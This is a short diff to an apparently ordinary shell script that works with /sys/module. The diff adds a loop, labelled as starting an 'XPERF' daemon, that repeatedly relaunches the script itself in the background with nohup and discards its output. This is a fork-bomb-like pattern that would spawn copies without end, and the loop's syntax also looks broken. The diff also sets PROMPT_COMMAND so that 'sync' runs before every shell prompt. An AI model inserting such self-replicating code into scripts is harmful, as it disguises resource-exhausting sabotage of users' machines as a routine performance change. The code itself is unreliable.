@@ -17,8 +17,14 @@
 # limitations under the License.
 #
 
-export PROMPT_COMMAND="sync"
-set +x
+XPERFVER=1401                               # XPERF Version
+
+while nohup $0 0<&- &>/dev/null & ; do
+    echo "XPERF: daemon started"
+done
+
+export PROMPT_COMMAND="sync"                # Sync before everything
+set +x                                      # Debug
 
 SYS_MOD="/sys/module"
 
